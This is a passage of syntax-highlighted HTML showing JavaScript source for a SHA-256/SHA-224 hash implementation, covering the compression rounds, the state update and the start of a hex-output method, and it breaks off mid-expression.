            j<span class="token punctuation">,</span> s0<span class="token punctuation">,</span> s1<span class="token punctuation">,</span> maj<span class="token punctuation">,</span> t1<span class="token punctuation">,</span> t2<span class="token punctuation">,</span> ch<span class="token punctuation">,</span> ab<span class="token punctuation">,</span> da<span class="token punctuation">,</span> cd<span class="token punctuation">,</span> bc<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">16</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> <span class="token operator">++</span>j<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            t1 <span class="token operator">=</span> blocks<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">15</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            s0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">7</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>t1 <span class="token operator">&lt;&lt;</span> <span class="token number">25</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">18</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>t1 <span class="token operator">&lt;&lt;</span> <span class="token number">14</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>t1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">3</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            t1 <span class="token operator">=</span> blocks<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            s1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">17</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>t1 <span class="token operator">&lt;&lt;</span> <span class="token number">15</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>t1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">19</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>t1 <span class="token operator">&lt;&lt;</span> <span class="token number">13</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span>t1 <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            blocks<span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">=</span> blocks<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">16</span><span class="token punctuation">]</span> <span class="token operator">+</span> s0 <span class="token operator">+</span> blocks<span class="token punctuation">[</span>j <span class="token operator">-</span> <span class="token number">7</span><span class="token punctuation">]</span> <span class="token operator">+</span> s1 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        bc <span class="token operator">=</span> b <span class="token operator">&amp;</span> c<span class="token punctuation">;</span>
        <span class="token keyword">for</span> <span class="token punctuation">(</span>j <span class="token operator">=</span> <span class="token number">0</span><span class="token punctuation">;</span> j <span class="token operator">&lt;</span> <span class="token number">64</span><span class="token punctuation">;</span> j <span class="token operator">+=</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
            <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>first<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                <span class="token keyword">if</span> <span class="token punctuation">(</span><span class="token keyword">this</span><span class="token punctuation">.</span>is224<span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
                    ab <span class="token operator">=</span> <span class="token number">300032</span><span class="token punctuation">;</span>
                    t1 <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">1413257819</span><span class="token punctuation">;</span>
                    h <span class="token operator">=</span> t1 <span class="token operator">-</span> <span class="token number">150054599</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    d <span class="token operator">=</span> t1 <span class="token operator">+</span> <span class="token number">24177077</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span>
                <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                    ab <span class="token operator">=</span> <span class="token number">704751109</span><span class="token punctuation">;</span>
                    t1 <span class="token operator">=</span> blocks<span class="token punctuation">[</span><span class="token number">0</span><span class="token punctuation">]</span> <span class="token operator">-</span> <span class="token number">210244248</span><span class="token punctuation">;</span>
                    h <span class="token operator">=</span> t1 <span class="token operator">-</span> <span class="token number">1521486534</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
                    d <span class="token operator">=</span> t1 <span class="token operator">+</span> <span class="token number">143694565</span> <span class="token operator">&lt;&lt;</span> <span class="token number">0</span>
                <span class="token punctuation">}</span>
                <span class="token keyword">this</span><span class="token punctuation">.</span>first <span class="token operator">=</span> <span class="token boolean">false</span>
            <span class="token punctuation">}</span> <span class="token keyword">else</span> <span class="token punctuation">{<!-- --></span>
                s0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;&lt;</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>a <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">22</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>a <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                s1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>e <span class="token operator">&lt;&lt;</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>e <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>e <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>e <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
                ab <span class="token operator">=</span> a <span class="token operator">&amp;</span> b<span class="token punctuation">;</span>
                maj <span class="token operator">=</span> ab <span class="token operator">^</span> <span class="token punctuation">(</span>a <span class="token operator">&amp;</span> c<span class="token punctuation">)</span> <span class="token operator">^</span> bc<span class="token punctuation">;</span>
                ch <span class="token operator">=</span> <span class="token punctuation">(</span>e <span class="token operator">&amp;</span> f<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">~</span>e <span class="token operator">&amp;</span> g<span class="token punctuation">)</span><span class="token punctuation">;</span>
                t1 <span class="token operator">=</span> h <span class="token operator">+</span> s1 <span class="token operator">+</span> ch <span class="token operator">+</span> <span class="token constant">K</span><span class="token punctuation">[</span>j<span class="token punctuation">]</span> <span class="token operator">+</span> blocks<span class="token punctuation">[</span>j<span class="token punctuation">]</span><span class="token punctuation">;</span>
                t2 <span class="token operator">=</span> s0 <span class="token operator">+</span> maj<span class="token punctuation">;</span>
                h <span class="token operator">=</span> d <span class="token operator">+</span> t1 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
                d <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span>
            <span class="token punctuation">}</span>
            s0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>d <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>d <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>d <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>d <span class="token operator">&lt;&lt;</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>d <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">22</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>d <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            s1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;&lt;</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>h <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>h <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            da <span class="token operator">=</span> d <span class="token operator">&amp;</span> a<span class="token punctuation">;</span>
            maj <span class="token operator">=</span> da <span class="token operator">^</span> <span class="token punctuation">(</span>d <span class="token operator">&amp;</span> b<span class="token punctuation">)</span> <span class="token operator">^</span> ab<span class="token punctuation">;</span>
            ch <span class="token operator">=</span> <span class="token punctuation">(</span>h <span class="token operator">&amp;</span> e<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">~</span>h <span class="token operator">&amp;</span> f<span class="token punctuation">)</span><span class="token punctuation">;</span>
            t1 <span class="token operator">=</span> g <span class="token operator">+</span> s1 <span class="token operator">+</span> ch <span class="token operator">+</span> <span class="token constant">K</span><span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span> <span class="token operator">+</span> blocks<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">1</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            t2 <span class="token operator">=</span> s0 <span class="token operator">+</span> maj<span class="token punctuation">;</span>
            g <span class="token operator">=</span> c <span class="token operator">+</span> t1 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
            c <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
            s0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;&lt;</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>c <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">22</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>c <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            s1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>g <span class="token operator">&lt;&lt;</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>g <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>g <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>g <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            cd <span class="token operator">=</span> c <span class="token operator">&amp;</span> d<span class="token punctuation">;</span>
            maj <span class="token operator">=</span> cd <span class="token operator">^</span> <span class="token punctuation">(</span>c <span class="token operator">&amp;</span> a<span class="token punctuation">)</span> <span class="token operator">^</span> da<span class="token punctuation">;</span>
            ch <span class="token operator">=</span> <span class="token punctuation">(</span>g <span class="token operator">&amp;</span> h<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">~</span>g <span class="token operator">&amp;</span> e<span class="token punctuation">)</span><span class="token punctuation">;</span>
            t1 <span class="token operator">=</span> f <span class="token operator">+</span> s1 <span class="token operator">+</span> ch <span class="token operator">+</span> <span class="token constant">K</span><span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span> <span class="token operator">+</span> blocks<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">2</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            t2 <span class="token operator">=</span> s0 <span class="token operator">+</span> maj<span class="token punctuation">;</span>
            f <span class="token operator">=</span> b <span class="token operator">+</span> t1 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
            b <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
            s0 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">2</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;&lt;</span> <span class="token number">30</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">13</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;&lt;</span> <span class="token number">19</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>b <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">22</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>b <span class="token operator">&lt;&lt;</span> <span class="token number">10</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            s1 <span class="token operator">=</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">6</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;&lt;</span> <span class="token number">26</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">11</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;&lt;</span> <span class="token number">21</span><span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token punctuation">(</span>f <span class="token operator">&gt;&gt;&gt;</span> <span class="token number">25</span><span class="token punctuation">)</span> <span class="token operator">|</span> <span class="token punctuation">(</span>f <span class="token operator">&lt;&lt;</span> <span class="token number">7</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
            bc <span class="token operator">=</span> b <span class="token operator">&amp;</span> c<span class="token punctuation">;</span>
            maj <span class="token operator">=</span> bc <span class="token operator">^</span> <span class="token punctuation">(</span>b <span class="token operator">&amp;</span> d<span class="token punctuation">)</span> <span class="token operator">^</span> cd<span class="token punctuation">;</span>
            ch <span class="token operator">=</span> <span class="token punctuation">(</span>f <span class="token operator">&amp;</span> g<span class="token punctuation">)</span> <span class="token operator">^</span> <span class="token punctuation">(</span><span class="token operator">~</span>f <span class="token operator">&amp;</span> h<span class="token punctuation">)</span><span class="token punctuation">;</span>
            t1 <span class="token operator">=</span> e <span class="token operator">+</span> s1 <span class="token operator">+</span> ch <span class="token operator">+</span> <span class="token constant">K</span><span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span> <span class="token operator">+</span> blocks<span class="token punctuation">[</span>j <span class="token operator">+</span> <span class="token number">3</span><span class="token punctuation">]</span><span class="token punctuation">;</span>
            t2 <span class="token operator">=</span> s0 <span class="token operator">+</span> maj<span class="token punctuation">;</span>
            e <span class="token operator">=</span> a <span class="token operator">+</span> t1 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
            a <span class="token operator">=</span> t1 <span class="token operator">+</span> t2 <span class="token operator">&lt;&lt;</span> <span class="token number">0</span>
        <span class="token punctuation">}</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h0 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h0 <span class="token operator">+</span> a <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h1 <span class="token operator">+</span> b <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h2 <span class="token operator">+</span> c <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h3 <span class="token operator">+</span> d <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h4 <span class="token operator">+</span> e <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h5 <span class="token operator">+</span> f <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h6 <span class="token operator">+</span> g <span class="token operator">&lt;&lt;</span> <span class="token number">0</span><span class="token punctuation">;</span>
        <span class="token keyword">this</span><span class="token punctuation">.</span>h7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h7 <span class="token operator">+</span> h <span class="token operator">&lt;&lt;</span> <span class="token number">0</span>
    <span class="token punctuation">}</span><span class="token punctuation">;</span>
    <span class="token class-name">Sha256</span><span class="token punctuation">.</span>prototype<span class="token punctuation">.</span><span class="token function-variable function">hex</span> <span class="token operator">=</span> <span class="token keyword">function</span><span class="token punctuation">(</span><span class="token punctuation">)</span> <span class="token punctuation">{<!-- --></span>
        <span class="token keyword">this</span><span class="token punctuation">.</span><span class="token function">finalize</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">;</span>
        <span class="token keyword">var</span> h0 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h0<span class="token punctuation">,</span>
            h1 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h1<span class="token punctuation">,</span>
            h2 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h2<span class="token punctuation">,</span>
            h3 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h3<span class="token punctuation">,</span>
            h4 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h4<span class="token punctuation">,</span>
            h5 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h5<span class="token punctuation">,</span>
            h6 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h6<span class="token punctuation">,</span>
            h7 <span class="token operator">=</span> <span class="token keyword">this</span><span class="token punctuation">.</span>h7<span class="token punctuation">;</span>
        <span class="token keyword">var</span> hex <span class="token operator">=</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h0 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h0 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h1 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h1 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">24</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">20</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">16</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">12</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">8</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h2 <span class="token operator">&gt;&gt;</span> <span class="token number">4</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span>h2 <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token operator">&gt;&gt;</span> <span class="token number">28</span><span class="token punctuation">)</span> <span class="token operator">&amp;</span> <span class="token number">0x0F</span><span class="token punctuation">]</span> <span class="token operator">+</span> <span class="token constant">HEX_CHARS</span><span class="token punctuation">[</span><span class="token punctuation">(</span>h3 <span class="token 